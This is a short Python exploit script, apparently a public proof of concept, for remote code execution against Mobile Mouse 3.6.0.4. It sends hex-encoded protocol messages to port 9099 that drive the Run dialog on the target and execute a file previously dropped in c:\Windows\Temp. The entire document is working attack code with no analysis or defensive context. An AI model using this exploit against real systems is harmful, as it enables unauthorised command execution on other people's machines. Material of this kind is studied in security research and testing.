#!/usr/bin/env python3

import socket
from time import sleep
import argparse

help = " Mobile Mouse 3.6.0.4 Remote Code Execution "
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target", help="Target IP", required=True)
parser.add_argument("--file", help="File name to Execute")

args = parser.parse_args()

host = args.target
command_shell = args.file
port = 9099 # Default Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

CONN = bytearray.fromhex("434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
s.send(CONN)
run = s.recv(54)

RUN = bytearray.fromhex("4b45591e3131341e721e4f505404")
s.send(RUN)
run = s.recv(54)
print("Executing Uploaded shell...")

shell_string= f"c:\Windows\Temp\{command_shell}".encode('utf-8')
hex_run = shell_string.hex()
RUN3 = bytearray.fromhex("4B45591E3130301E" + hex_run + "1E04" + "4b45591e2d311e454e5445521e04")
s.send(RUN3)
run3 = s.recv(96)
sleep(5)
s.close()
